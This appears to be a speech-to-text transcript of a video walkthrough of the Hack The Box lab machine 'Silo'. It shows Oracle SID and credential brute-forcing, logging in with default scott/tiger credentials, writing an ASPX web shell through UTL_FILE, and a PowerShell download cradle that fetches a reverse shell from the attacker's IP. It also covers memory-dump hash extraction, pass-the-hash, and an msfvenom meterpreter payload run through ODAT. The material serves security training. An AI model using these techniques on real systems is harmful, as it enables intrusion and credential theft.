 what's going on YouTube this is IPSec and we doin silo from half the box which was a pretty amazing machine with a unique attack path and if you don't think so chances are you were one of the many that took a shortcut and did the Box a unintended way but hey all is fair when it comes to hacking it's actually kind of a funny story egress the creator of this box had didn't really know much about local he wanted to learn about local and create a hack the box machine so he created silo which combines both he could learn how to set up Oracle and create a box at the same time his intended route was to have its you brute force credentials into the box you drop a file on the web server that file has to be a ASP shell so when you navigate to it over HTTP it executes you get out of low profile and then you find a memory dump on the server you grab that memory dump use volatility pull hashes out of it and then pass the hash into the server however egress didn't really know about a tool called ode at the Oracle database attack tool which everyone used against his server and made it so you could just go from Oracle shell to either reading the flags or just instantly getting a system shell by uploading a file and executing it so we'll do the Box both ways the first way we're not gonna use any automated tools or anything and then the second way we will use Odette and I will explain how you can potentially learn how these attacks work using verbosity Flags and Odette so yeah let's just jump in as always we start with the end map so I map - SC for safe scripts as V and memory versions Oh a output all formats put in the end map directory and call this silo then the IP address of the box which is 10 10 10 82 I've already ran this so let's just look at the results and we see a whole bunch of stuff is open we have AI is on port 80 this is HTTP it's version 8.5 so we know this is 2012 or - if you didn't know that you could just watch one of my previous videos where I show you just googling Microsoft IAS versions and this maps to actual os's then we have samba SMB on port 139 and four four five a bunch of Microsoft Remote procedural calls on 135 then of 49,000 ports and we have Oracle listening on port 1521 and a point 49 160 the world cool stuff is odd because we haven't really seen that before an actor box I think this is the first machine with Oracle so this is definitely something to look into but before you look into that let's just go check out the website because we know HTTP oh so well and gets up some recon going in the background while we poke at Oracle so go into 10-10-10 82 we just see the blank iis page so no website so let's see if we can find any content or do you go Buster - eh and then we'll specify - you the URL so 10 10 10 80 to the word list user share word list do a Buster directory list - 3 medium and then we'll just can out file saying go Buster - root text let that run we can rename this to recon and then let's poke at the Oracle database in order to do that we're going to use a tool called Odette that is the Oracle database attacking tool so just Google Odette github and this is going to be a little bit of a painful install but installing is the best way there is like a static build of Odette and Dockers I find just installing this on Kali is good and then as benefit you get a sequel + client which allows you to connect to Oracle manually which is also great so what do you get clone and download this go into the directory and let's follow the instructions for installing it it's way at the bottom of this github page so the first thing we have to do is grab this sub modules then we have to do this sudo apt-get install to install some dependencies looks like I have everything installed and now we're gonna have to convert some rpms from Oracle to Debian packages and those are up here and this is going to require you to log into Oracle I believe so click accept the License Agreement try to download something and it wants you to login the account is free so just register an account and then you'll be able to download all the files so we'll save this file if I go back do I stay logged in I downloaded that twice I probably download that a few times now let's just github odet go down to install go back to this page I signed in yes I am accept so we just download that instant client so I'm going to download it again and I'm going to clear out my downloads directory because I have no clue what just happened there so delete all our PM's I'm gonna make a install directory and now we're gonna download stuff so let's see we want to get the I think it was the basic client the sequel plus and the devel let's go back to that page sure help control so I opened that tab when I click that link oh well there we go the basic sequel plus and devel i think i grad version 18 i grabbed 18 this is saying a weapon it should be fine move downloads start our p.m. here ok then we can just alien everything so alien to Deb start p.m. and this is gonna take a few minutes so I'm gonna pause the video and when this alien command finishes we can resume and then install the Deb files which is just Debian packages or PM's are for like centers and Red Hat so yeah alien is finished we have all the packages I guess it's just D package - I yep so D package - I install all three rpms and then after that we have to put these lines in our Etsy profile directory so oh oh I did start and it tried to do D package - I on the RPMs do dot Deb but we see it did actually set it up here so that works so V Etsy profile and then it wants us to set the path so let's see if we are route sure take op the wrong thing there we go I think that path is gonna be wrong let's see OS user web for achill 18 3 so 18.3 that should be fine okay it's good a new batch profile by exiting thing and then just creating a new pane you could also just type bash or read on that C profile thing but we do sequel + 64 it does work so we have successfully installed that and now we can get back to Oh dad the very first thing to do is oh no module installed named C X underscore Oracle pip install CX Oracle know it oh this does exist I gotta remove all those other stuff okay that worked I don't know why it complained about that module but Odette - H and while we do this go back to the recon tab go Buster hasn't found anything yet so let's see we have a bunch of commands we can do the very first thing we have to do is know what it said it is and the CID is something you do before a username and password I don't know exactly what it means I'm guessing it's like a not a database because what Cole has databases in it but it's like above a database and what the database is under or something you'd have to read up on Oracle I actually know very little about Oracle so let's just try doc /pi CID guesser - H and then we want to do let's see - s 10 10 10 82 - P 1521 and let's see as a default CID so that's fine and now it's searching valid SIDS for this and we can also have done Metasploit if we start first grass source searches it fast let me do MSF console and this isn't work will sip root as well because I think I did that correctly and adapt when I did this box I honestly just used Metasploit so if we do search for Oracle go up to auxiliary scanner stuff we have Sid brute so you could do use auxiliary scanner Sid brute then set our host 10 10 10 81 or 82 not 81 I'm gonna just run this and we see X E is a valid SID we got another sid pls ext proc but this appears to be going much faster than Oh dad this module finishes it'll probably tell us all the valid states but I'm just gonna control see it because we know it's XE and I guess we can wait three minutes for Odette to finish to see if I did that command correctly if not we're just gonna proceed with XE and instead of pause in the video we can try to do a login brute so search Oracle will do search scanner Oracle and this didn't work for me before and I actually used Odette to do this piece look were login we want to do our host ten ten ten eighty two ports as not required let's see speed we have our host we just did SIDS XE correct stop my make success yeah that's fine one thread verbose we have all the options run cannot continue without a valid port list so we'll do set ports 1512 and this is what I kept getting when I tried it just it reporting closed so when her dad finishes the SIB route we can then use Odette to brute-force logins so I'm gonna pause the video again I'm just gonna wait for this to finish so Odette has completed the CID brute force based upon a word list and we see it discovered XE and XE X DB was a valid CID and it's now actually doing a brute-force attacks on the number of characters so I'm gonna cancel that because that's going to take forever so we know the valid SID is probably going to be X e we could probably try the other one but we're just going to use XE so the next thing we have to do is the password guesser so let's do password guesser - H and we can see the options so again we need the server with - s so 10 10 10 80 - then we need let's see the accounts file has multiple things we'll need - D for the SID so X e but let's see accounts file file containing Oracle credentials and by default they have in an account slash accounts text so let's take a look at that file so go into that unless this and everything is completely capital and I don't like that because I think it's Oracle 9 it actually was kind of like land man and the uppercase - everything and then did hashes and logins but now Oracle was actually case-sensitive own users so this is kind of an old weird list so let's go into accounts and grab the one Metasploit uses because this one appears to be a little bit better so if we look at this file we got lower case and probably upper case so when I copy that here and for the sake of simplicity I'm just going to overwrite it so we have to worry about doing an argument so it just defaults and the other thing we have to do is if you noticed the previous one it's separated using a password by a slash so I'm gonna do a said that / base / then escape the next / / G and replace all spaces and I'm going to cheat because this does take forever to do I'm gonna put the password near the top so we want to wait a long time so let's do X e I think this is it if we didn't do it we just do - - account it didn't overwrite it we do - - accounts file and then specify the filename what here we go searching for valid accounts and probably within the next 30 40 seconds it'll go through the three or four and get the correct credentials which is scott / tiger so this is where i'm gonna stop using odette for now and we're gonna do everything manually and the manual exploitation is a lot harder than using odette at the end when use odet - just send us a shell as administrator to do it without Odette we have to run a bunch of sequel + commands to drop a file on the webserver execute that file then we get a shell as a loop reviews err because we're not oracle anymore we execute it as iis then you can either probably do rotten potato as I show on Talley and Jeeves or you can do it through some forensics which is the way I'm gonna show it and if I haven't been recording forever I may go back and show rotten potato but I'll definitely show the Odette way after I do it the intended way so all that made sense good we'll continue if it didn't make sense well go listen again or we'll just continue anyways so let us get out of the Odette and we'll just do sequel +64 scott / tiger at 10:10 1082 1521 / x ii I wonder if my Metasploit I did 1512 I don't know so sequel + username / password at IP address : the port / xe4 the cid and then we get the sequel prompt and if you're wondering where the Scott username Tiger password came from this is a default Oracle password Scott was one of the original developers Tiger was the name of his cat and they just made it the default credentials to Oracle so default creds got you into Oracle and we can do select star from session underscore prints and see what privileges we have there's also select star from user role prints and we don't really have that many privileges right now let's exit the sequel plus client with control D you could probably just type to exit or something but do space as sis DBA on this this is kind of like sudo so now we're connecting to the Oracle database with the default credentials as a system database administrator and then when we do select star from session prints you can see how many more things we have we could also do select star from user role ribs and see we still have a lot more privileges as a DBA this is gonna allow us to do some cool things like reading files and unlike my sequel it's a bit more difficult to read oracle has its own language and if job is installing the server which it's not here you can even run java with an Oracle so the first thing one do is declare variables because it's not a dynamic typed language so declare the variable named F and this is gonna be UTL file dot file underscore type s and there's gonna be care and we'll just specify 200 and length then begin because we're done for our declarations so the file is going to be equal to u TL file F open and then we want to specify the directory so this is going to be let's see we could do the flags we could get root administrator desktop root text here so we're not going to do that because I don't know that world could command to only say the number of characters and I don't feel like displaying the flag so instead we're gonna do I net pub /ww root and then the file name is going to be I is start dot HTM and when I open that as read now we want to get the line so you TL underscore file get line F comma s UTL underscore file close it then let's see DBMS underscore output dot put lines is like a print statement and then we can end then we do slash we screwed something up let's see I don't have the up error so it's a bit of a pain let's exit this the read file paste let's do 5x we'd all this stuff okay where did I screw up we declare UT l underscore file dot file underscore type that looks good s equals care 200 and then DB s underscore output dot put underscore lines put underscore line is what I want about lines cat read file paste that in and then you do slash to actually run Oracle so put that here I pasted and slash and we see the procedure successfully completed we don't see any output so I'm going to set server output on and then do slash again to run the last thing we did and we see the beginning of that HTML file so that's it I wonder if we change 200 that's like the first 200 characters v let's do 400 this is gonna print anymore if not we already hit the limit that we can output yeah I think there's a limit that you can output or maybe it only does one line at a time and this is one line but that would have worked to grab the flags that is the easiest way to do this box the harder way to do this box is we got this files over here and if we look we haven't found anything in go buster so I'm just gonna kill go Buster because we don't need that running anymore but we can actually write files as well so we'll do write file and that's going to be essentially the same thing so declare F is UTL file dot file tight s is care we'll do five thousand and then we can set this equal to please subscribe because we're going to write text so I actually want this to be something begin F same thing so utl Phi F open slash I net pub / dub dub dub root and then we want to call this hello world dot txt and open this for right now we have to put the line so you TL file but line forgot the semicolon venue TL file F close and we can end this and then cat write file and see if this works slash encountered the symbol s with the following how would you told me what line that was on let me just glance over this code we may have to define the directory before we run this command okay that looks f UTL underscore file dot file type don't have a semicolon those that get you every time let's try this there we go successfully completed so let's try going to hello world dot txt and we can see please subscribe is there so we have codecs well we can write files to the web server so the next thing wouldn't do is search for a web shell for like a aspx web shell because windows generally execute ASP files so minimize that again and then we can do let's see locate aspx maybe that'll do it so that just shows me all the files ending with ASP X so let's see you just share web shells aspx CMD ASP this will work and then we have other ones I had done on other boxes but copy this here let's actually make a dub yeah let's make a shell directory move it to shells and then we're gonna have to make a few modifications do this the Oracle doesn't only like things above like I think 1024 characters to be said so we have to make this a bit smaller and we also want to put this all on one line so if we do a wood count on this shell it's 1,400 characters and if we do said to remove all the newline characters it is going to be around 1350 characters so you have to get rid of 300 characters out of this so what we're going to do and we're gonna get rid of this head we don't need that get rid of these comments we don't need them and then I'm gonna make this a little less pretty and get rid of this formatting that style equals it should still work it just won't be as pretty and I can deal with that if you didn't do this the next command would just error out so we got it down to nine hundred and ninety-one characters which should be fine so let's copy this copy everything then go up one them right file replace please subscribe with a shell code we're not shellcode but the ASP shell and then we'll call this file comments welcome dot aspx and hope this works so cat that copy paste do a slash to execute this says it eggs you completely successfully and then what I named it comments welcome dot aspx there we go execute so we can do Who am I and we are is pool default a eight or at pool we can do Who am I slash all and we can see we do have the SE impersonate privilege so run and potato is likely to work here but we're not gonna do that we're gonna get a reverse shell and look at files on this so let us get a sequel plus and we'll copy in a shame so CP [Music] PowerShell nishang shells invoke powershell tcp dot PS 1 okay let's just rename that to something easier and move this to dub dub dub so make directory dub dub dub move it in there and name this rev ps1 okay I always like just putting this command at the very bottom so it executes soon as it reads this into memory and let's use port 9001 because well it's got to be over 9000 doesn't have to be but it's just fun to say and then my IP address I think I'm 10 10 10 for time 0 10 10 10 10 10 14 for no it had me a little confused there we go that looks good python m simple HTTP server okay we want to listen on port 80 and i actually want to do it on this one just because when i get reversed shells i like it being the long way so i can easily copy and paste so we're listening on that we just need n CL v MP 9001 and then we can do powershell IX new object net web client download string HTTP 10 10 14 4 Rev ps1 and exit and all the strings execute copy this just case I made a typo I didn't we see it got it and then I got the reverse shell so if we want to go and grab the flag that's in users administrator we're not root so we can't get an administrator the user is Phinehas or Phineas I think it's Phineas dir get a desktop because we want to grab the flag we would and then there's also a file called Oracle issue dot txt so let's take a look at that so get content and we see the support vendor engaged in troubleshoot Windows Oracle performance full memory dump requested it's at a Dropbox URL so we're going to copy this and when this box is being tested I swear I copy this into the Downloads folder but I don't see it there so I was hoping to do it so you didn't need Dropbox encase Dropbox went away I guess I didn't save when I copied into documents or something but if we go to that Dropbox URL we get the link you're trying to access is password protected we have the password right here and if we copy it and paste we get incorrect password and the reason is this isn't actually question mark this is a European symbol I think it's a pound sign but this terminal isn't UTF I think this is an ASCII so I can't see that so the very first thing I tried to do is let's see yeah let's make the directory SMB and then I can do in packet SMB server we need to give a share name so we'll call this share we'll call it pub and then this path will do PWD so the current path on that is where the share is going to be and I just did use let's do z : 10 10 14 4 pub I screwed something up net use the backslashes yep so we authenticated so I tried copying local issue dot txt to Z : and then if we look at this file cat Oracle issue it got rid of the question mark so if we try this for the password it still won't work again this is just one of those weird annoying encoding things so incorrect password the way around this I guess is rather annoying is um let's do file content is equal to get content or oh cool issue txt and win a base64 encode that's then transfer it to a machine so we got though all the text let's do file encode is equal to system text encoding UTF dot get bytes swear there's easier way to do base64 encoding in PowerShell I just don't remember it and then just type out something and I don't have up which makes it really annoying Fe is equal to system dot text encoding utf-8 dot get fights I bet I forgot the eight yeah I forgot the eight up there yep just have you TF get bytes okay then system dot convert - base64 string and then we want f.e okay copy this base64 go on this terminal echo - n pipe - base64 - D - decode and now we have I think that's a pound sign where that question mark was on an ashamed terminal I think if you use my trip now and just download the file and what I did it correctly so gain access to the drop box where we can download this memory dump of the server and then we use a tool called volatility to analyze it so let's download direct save shouldn't take too long I'm gonna catch four mini cats volatility I don't think this will work but it's still cool to show it off okay this isn't guys plugin just copy this while that downloads then me cat stop I set paste okay you're not to be on volatility folder here's fine download finished so move downloads siloed zip unzip the file this could take 30 or so seconds okay it's done if you don't have volatility you can just install it with at I think I have both volatility and volatility - tools installed so the first thing we have to do with this is identify what OS this is because volatility has different profiles which is how it reads the memory so we do file file silo DMP we see it's just a 64 bit crash dump so this is like if it blue screen of death you get this file and I forget what folder in the windows folder but volatility - H - get help these are all the plugins that it supports and then we have some stuff so - F for filename and volatility keeps complaining about mimikatz pi so i'm gonna find what i installed that before and delete it so I think I manually placed mimikatz dot PI in this user Lib folder once upon a time and that's something you never do never just place files in user web I do it because I'm lazy but it's not best practice this is generally a folder for package managers like apt or yum or whatever to place files and doing it confuses it if you make videos of it and got milk sees it he'll probably yell at you so never place files they're all sort of trying to be best practice and not place while I was there as well so that being said let's do the image info so volatility - f to specify file and then image info and this is going to scan the memory dump identify what potential OS it could be so it's gonna come back with a different bunch of different profiles we'll choose one of the 2012 or two profiles to play with volatility and while that goes let us and we don't need a reverse shell anymore their exit that volatility - H I will look at all the plugins this has to offer well that goes many cats will search the memory and pull plaintext passwords so we have your signatures vol shell let's see what ones do I like strings could be good list of open sockets so this will show all the like network connections that were active sessions is a good one screenshot is another good one ps3 so plan a process tree PS scan PS list proc dumb bunch of process type stuff let's do PS tree once we get a profile look at what's in notepad text memory mapping image info is what we're using hive scan hive list hive dump print out like registry stuff hash dump print out a bunch of hashes go through event log registries CMD scan consoles so you can get what's in the clipboard I'll actually try that to see if you had anything in the clip or at a time I haven't ran that yet but you can see a bunch of fun plugins I'm sure you can download more the volatility has finished though and we see suggested profiles it has quite a few let's just do - - profile when 2012 r2 x64 and then would I say clipboard let's throw on this plugin and see what happens doesn't look like we have anything it's still running yep still running give this probably a minute well that's not what I thought it would be let's do PS tree I think that was one of them this shouldn't take as long to finish maybe it does memory scans generally do take walk to analyze the whole dump file there we go I get a list of all the memory stuff I think that 0 is if it's interactive so we don't have any ones there so chances are maybe that's not gonna work because no one is logged in but if we do - - plugins I think that's just plugins is how you specify a plug-in directory will do root htb boxes silo vol because that's why I put the mini cats plug-in I'm gonna grab the mini I sure did - H for help and that will specify all the plugins and stuff that are there I think that was correct OS cat stop I see - - plugins well let's just run this if it gives you error you'll know why copy didn't use a Lib and if it doesn't then that flag does work yeah so oh we won't do mini cats you have to Google around how to do custom volatility plugins I don't use this tool that often but let's do hash dump and grab all the hashes of the OS because that's what we should have done and that's the intended way I'm guessing it's like - - plug-in - derp is something I'm just missing the flag come on - Tom there we go we get a bunch of hashes and we got the administrative hash so let's do a pass the hash so let's do PTH when exe and we want to do - you user names administrator once a space and then % and I think it's LM hash colon ntlm hash if you just do NT L in them it doesn't work it's weird because LM hash is now always gonna be a a d3 B whatever then a d3 B again because that's a blank LM hash but I digress I will just do CMD we've got the host so slash slash 10 10 10 80 - if this doesn't work then we will probably use in packet but nope we got it so if we do Who am I silo administrator we can go into users administrator desktop and we could have got route text so that is the intended way to do this box and we didn't use Metasploit once so now let's dig into just going straight to system with Odette the Oracle database exploitation tool so let's see exit everything go back into the directory and then if we do dot slash o dot pi dash H we can see a bunch of things so there is a UTL file to download and upload / delete files so UTL file - h and then we have the options so let's do 10 10 10 82 - d for the CID and that's going to be X E - you that's capital u Scott - P tiger and then let's see we want to do ut-oh - h actually we just want just play help I just did Nora I did display help we just want to - - put file the remote path will do is slash temp the file name let's use Metasploit so let's see MSF venom we'll just do it yeah MSF madam - P Windows x64 meterpreter to Ritter reverse tcp l host is equal to 10 10 14 for all port is equal to LS to 9000 - - f format Exe - oh please subscribe exe so put the file in C colon backslash tab we want to call this Thanks exe and the file was actually called please subscribed dot exe so we'll see if this puts the file and sufficient privilege because we need that - - sis DBA flag there we go the file was created so we took the file please subscribe on a box and placed it in C colon backslash temp and gave it the name thanks THC because I know you guys subscribed so that is me thanking you the next thing we have to do is execute so if we go back to Odette PI - H there is let's see external table to read files or execute system command slash scripts that sounds like something we want to do so external table - H and then essentially all the same flags so ten ten ten eighty two users Scott passwords tiger can't forget it - D for the SID this DBA then we're going to do dot - - exec remote path so that's going to be temp and the file thanks exe because thank you for giving me a shell we have to do MSF console I open up Metasploit and once we get done we'll do use exploit multi-camera and then set the payload of Windows xx to form interpreter set L host on 0 set L port 9000 to run that execute this and it's sending the stage and if we do get UID we're anti-authority system so we could do a CD slash users administrator desktop then download route text and if we did WCC on route our text it's 32 characters which is a md5 hash so that is how you would do it in Oh dad or Oracle database exploitation tool if you're curious exactly what happened um I actually don't know exactly how the external table things works but if I wanted to find out I would look at this verbosity mode verbosity and we can do that and see if it actually outputs all the commands so let's go back to this utl file thing and instead of calling it thanks I'll say you're awesome I'm going to add that vvv to make this as verbose as possible and see what this does Oh God so we create a new directory I guess this is replace just to type on the script Oh dad prefix something so what this is doing is essentially assigning this name to the directory temp so whenever work will cease Oh dad prefix whatever it knows it's temp and now they are Oh telling us what it's going to do here's it actually exiting the command so yes this is assigning this name to slash temp now we're granting readwrite on this directory to everyone so we may have want to just do this to scott instead of public and then we are loading the file please subscribe in - oh that's memory memory and now we're executing that declare thing like before a raw buffer instead of var care is what we used F open again this is going to be that slash temp and we're calling the file your awesome and now we are beginning to write and we're doing hex to raw so we loaded the file we in Python we convert it to hex and python and now in oracle we're giving it to the hex but telling it to convert to raw which is binary and then doing essentially the same thing we did when we saved a file and just doing it probably and oh looks like it did over a thousand 24 characters so maybe verkehr has a limit but Rahl did not have a limit but yep instead of put line it's put raw but that's how if you wanted to learn how like Oracle exploitation worked I'd advise you to play around with this box do other things put in for burst mode and just try to read the SQL it does to understand what is going on so I think that's gonna be it for this box so take care and I will see you all probably in two weeks I think next week is Def Con and I'm guessing there won't be a release at Def Con because most of the hack the box people will probably be at Def Con so don't want to do a release when no one's around to keep an eye on the servers but who knows maybe they'll be bold and do it anyways and then I'll talk video so yep thank you see ya